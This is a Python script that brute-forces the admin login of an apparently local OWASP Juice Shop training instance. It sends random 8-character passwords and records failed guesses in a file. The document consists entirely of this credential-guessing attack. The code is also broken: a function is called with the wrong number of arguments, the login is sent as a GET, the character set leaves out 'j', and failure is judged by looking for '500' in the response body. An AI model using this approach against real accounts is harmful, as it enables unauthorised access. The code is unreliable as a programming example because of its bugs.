import requests
import random


url = "http://localhost:3000/rest/user/login"
username = "admin@juice-sh.op"
length_password = 8

def send_request(url,username, password):
    data = {
        "email" : username,
        "password" : password
    }

    request = requests.get(url, data = data)
    return request
   


chars ="abcdefghiklmonpqrstuvwxyz0123456789"

def BruteForce():
    while True:
        valid = False
        while not valid:
            rndpasswd = random.choices(chars, k=length_password)
            password = "".join(rndpasswd)
            file = open("password_tries.txt","r")
            tries = file.read()
            file.close()
            if password in tries : 
                pass
            else : 
                valid =True

        request = send_request(username,password)

        if '500' in request.text.lower():
            with open("password_tries.txt","a") as f:
                f.write(f"{password}\n")
                f.close()
            print(f"incorrect paswword {password}\n")
        else : 
            print(f"Correct password {password}")
            with open("password_tries.txt","w") as f:
                f.write(password)

BruteForce()
    